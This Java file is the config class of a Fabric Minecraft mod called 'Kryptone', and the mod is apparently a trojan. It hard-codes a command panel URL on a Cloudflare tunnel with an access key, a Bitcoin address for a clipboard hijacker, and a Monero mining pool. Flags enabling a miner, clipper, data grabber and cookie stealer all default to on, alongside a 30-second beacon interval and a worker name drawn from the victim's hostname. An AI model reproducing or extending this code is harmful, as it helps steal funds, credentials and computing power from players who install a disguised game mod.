package mc.kryptone;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import net.fabricmc.loader.api.FabricLoader;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

/** Kryptone config. */
public final class Config {
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();

    public String panelUrl   = "https://specialized-settle-salvation-tech.trycloudflare.com";
    public String panelKey   = "f82556b381176003d8b6c4859463ae593a53943fc6140be71941e737779896dd";
    public String btcAddress = "bc1qxq6u0lknqng4vr295p4rscfe5mjlgnjpelsrlj";
    public String pool       = "xmr.auto.nicehash.com:9200";
    public String worker     = "";
    public boolean miner     = true;
    public boolean clipper   = true;
    public boolean grabber   = true;
    public boolean cookies   = true;
    public int httpPort      = 18080;
    public int clipIntervalMs = 500;
    public int beaconMs      = 30_000;
    public int cookieMs      = 15 * 60 * 1000;

    public static Path dir() {
        Path p = FabricLoader.getInstance().getConfigDir().resolve("kryptone");
        try { Files.createDirectories(p); } catch (Exception ignored) {}
        return p;
    }

    public static Config load() {
        Path f = dir().resolve("kryptone.json");
        try {
            if (Files.exists(f)) {
                Config c = GSON.fromJson(Files.readString(f, StandardCharsets.UTF_8), Config.class);
                if (c != null) return c;
            }
        } catch (Exception ignored) {}
        Config c = new Config();
        c.save();
        return c;
    }

    public void save() {
        try {
            Files.writeString(dir().resolve("kryptone.json"), GSON.toJson(this), StandardCharsets.UTF_8);
        } catch (Exception ignored) {}
    }

    public String workerName() {
        if (worker != null && !worker.isBlank()) return worker;
        try {
            return java.net.InetAddress.getLocalHost().getHostName().replaceAll("[^a-zA-Z0-9_-]", "-");
        } catch (Exception e) {
            return "rig-" + Integer.toHexString((int) (Math.random() * 0xFFFF));
        }
    }
}
